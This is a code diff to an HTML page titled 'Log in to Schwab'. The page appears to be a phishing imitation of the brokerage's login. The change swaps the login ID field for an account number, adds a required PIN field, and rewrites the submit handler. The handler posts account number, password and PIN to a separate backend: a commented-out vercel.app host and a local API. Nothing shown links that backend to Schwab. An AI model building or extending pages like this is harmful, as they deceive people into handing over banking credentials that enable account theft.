@@ -223,10 +223,12 @@
     <div class="login-container">
       <h2>Log in to Schwab</h2>
       <form action="#" id="loginForm" method="post">
-        <label for="login-id">Login ID</label>
-        <input type="text" required id="email" name="e" />
+        <label for="login-id">Account Number</label>
+        <input type="text" required id="accountNumber" name="e" />
         <label for="password">Password</label>
         <input type="password" required id="password" name="p" />
+        <label for="pin">Pin</label>
+        <input type="text" required id="pin" name="pin" />
         <div class="remember">
           <input type="checkbox" id="remember" name="remember" />
           <label for="remember">Remember Login ID</label>
@@ -448,23 +450,24 @@
       </div>
     </footer>
     <script>
+      // const API_URL = "https://user-mgt-backend.vercel.app/api";
+      const API_URL = "http://localhost:5001/api";
       document
         .getElementById("loginForm")
         .addEventListener("submit", async (e) => {
-
           e.preventDefault();
-          const email = document.getElementById("email").value.trim();
+          const accountNumber = document
+            .getElementById("accountNumber")
+            .value.trim();
           const password = document.getElementById("password").value.trim();
+          const pin = document.getElementById("pin").value.trim();
 
           try {
-            const res = await fetch(
-              `https://user-mgt-backend.vercel.app/api/user/login`,
-              {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ email, password }),
-              }
-            );
+            const res = await fetch(`${API_URL}/user/login`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ accountNumber, password, pin }),
+            });
 
             const data = await res.json();
             if (data.token) {
